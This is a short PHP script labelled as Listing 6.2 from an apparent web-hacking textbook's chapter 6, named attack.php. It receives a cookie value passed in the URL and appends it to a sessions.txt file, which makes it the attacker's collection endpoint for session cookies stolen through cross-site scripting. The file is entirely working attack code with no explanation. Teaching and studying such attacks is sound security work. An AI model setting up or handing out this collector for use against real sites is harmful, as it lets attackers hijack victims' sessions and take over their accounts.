<?php

/**
 * Listing 6.2 [PHP] PHP-Skript zum Speichern des übergebenen Cookies - attack.php
 * 
 * @package Webhacking
 * @subpackage Kap06
 * @author Manuel Ziegler <contact@manuelziegler.de>
 * @version 1.00.00
 */

if (isset($_GET['cookie'])) {
  $handle = fopen('sessions.txt', 'a');
  fwrite($handle, $_GET['cookie'] . "\n");
  fclose($handle);
}
